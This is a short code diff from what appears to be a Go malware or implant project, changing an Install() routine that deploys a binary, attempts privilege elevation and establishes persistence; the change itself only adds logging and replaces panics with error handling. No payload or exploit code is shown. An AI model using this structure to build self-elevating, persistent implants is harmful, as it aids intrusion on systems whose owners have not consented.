@@ -86,12 +86,15 @@ func persist(ptype int) error {
 //Install attempts to deploy the binary to the system and establish persistence.
 //It also assembles the install configuration and saves it.
 func Install() {
+	defer util.Calm()
 	Info.Date = time.Now()
 
-	util.ElevateLogic()
+	log.Println("Attempting elevation")
+	err := util.ElevateLogic()
+	log.Println("Elevation error:", err)
 
 	base, err := CreateBase()
-	util.Panicln(err, "Base creation failed")
+	util.Handle(err, "Base creation failed")
 	Info.Base = base
 	log.Println("Base set: " + base)
 
@@ -115,7 +118,7 @@ func Install() {
 	log.Println("Install complete")
 
 	err = WriteInstallInfo()
-	util.Panicln(err, "Failed to dump install configuration")
+	util.Handle(err, "Failed to dump install configuration")
 
 }
 
